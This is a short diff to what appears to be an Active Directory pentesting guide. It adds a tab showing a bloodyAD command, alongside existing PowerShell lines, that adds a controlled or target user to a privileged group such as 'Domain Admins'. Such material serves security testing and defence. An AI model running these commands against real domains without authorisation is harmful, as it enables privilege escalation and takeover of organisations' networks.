@@ -32,4 +32,12 @@ Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'
 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
 ```
 {% endtab %}
+
+{% tab title="Windows/UNIX-like" %}
+It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
+```bash
+bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password add groupMember $TargetGroup $TargetUser
+```
+{% endtab %}
+
 {% endtabs %}
